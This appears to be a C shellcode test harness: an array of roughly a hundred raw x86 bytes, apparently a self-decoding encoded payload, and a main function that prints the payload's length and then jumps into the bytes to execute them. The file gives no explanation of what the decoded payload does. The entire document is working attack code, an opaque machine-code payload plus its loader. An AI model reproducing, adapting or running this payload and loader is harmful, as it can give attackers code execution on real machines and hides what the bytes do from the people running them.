#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\xbb\x6a\x2b\x63\xed\xdd\xc1\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"
"\x14\x83\xea\xfc\x31\x5a\x0e\x03\x30\x25\x81\x18\xf5\xf9\x74"
"\x2a\xc4\x2b\x26\xc4\x48\xe3\xb5\x79\xfc\xd4\x16\xe0\x95\xa3"
"\x8a\xb4\x0d\xdb\x38\x35\xcd\x4b\xa4\x18\xbf\xe4\x4e\x10\x5a"
"\x89\xf8\xbe\x89\x1d\x77\x5a\xb9\xf0\x5a\xca\x56\x82\x47\x42"
"\xc0\xbb\xa8\x4c\x3f\x4d\x57\xc2\x57\x60\xea\x85\xc1\xf3\xec"
"\x1a\x5f\x35\x23\xcb\x09\x66\x4a\x0d\x05\x83\x81\x4e";

int main(void) {
    printf("Shellcode Length: %d\n", strlen(code));
    ((void(*)(void))code)();
}
